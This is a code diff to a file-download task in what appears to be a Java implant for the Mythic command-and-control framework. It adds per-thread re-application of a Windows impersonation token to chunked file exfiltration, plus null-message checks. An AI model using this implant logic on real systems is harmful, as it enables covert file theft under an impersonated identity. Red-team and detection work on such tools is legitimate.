@@ -24,22 +24,34 @@ public class DownloadBackgroundTask implements Runnable {
     private final ObjectMapper objectMapper;
     private final String fullPath;
     private final int totalChunks;
+    private final com.sun.jna.platform.win32.WinNT.HANDLE impersonationToken;
     
-    public DownloadBackgroundTask(BackgroundTask task, Config config, String fullPath, int totalChunks) {
+    public DownloadBackgroundTask(BackgroundTask task, Config config, String fullPath, int totalChunks, com.sun.jna.platform.win32.WinNT.HANDLE impersonationToken) {
         this.task = task;
         this.config = config;
         this.objectMapper = new ObjectMapper();
         this.fullPath = fullPath;
         this.totalChunks = totalChunks;
+        this.impersonationToken = impersonationToken;
     }
     
     @Override
     public void run() {
         try {
+            // Re-apply impersonation token if present (each thread needs its own token applied)
+            if (impersonationToken != null) {
+                Config.debugLog(config, "Re-applying impersonation token in download background thread");
+                com.woopsie.utils.WindowsAPI.reApplyToken(impersonationToken);
+            }
+            
             Config.debugLog(config, "Download background task started: " + task.getTaskId());
             
             // Wait for the initial message with file_id from Mythic
             JsonNode initialMessage = task.receiveFromTask();
+            if (initialMessage == null) {
+                Config.debugLog(config, "Download task received null initial message, exiting");
+                return;
+            }
             Config.debugLog(config, "Received initial message: " + initialMessage);
             
             String fileId = initialMessage.get("file_id").asText();
@@ -82,6 +94,10 @@ public class DownloadBackgroundTask implements Runnable {
                     
                     // Wait for acknowledgment from Mythic before sending next chunk
                     JsonNode ack = task.receiveFromTask();
+                    if (ack == null) {
+                        Config.debugLog(config, "Download task received null ack, stopping transfer");
+                        break;
+                    }
                     Config.debugLog(config, "Received ack for chunk " + chunkNum);
                 }
             }
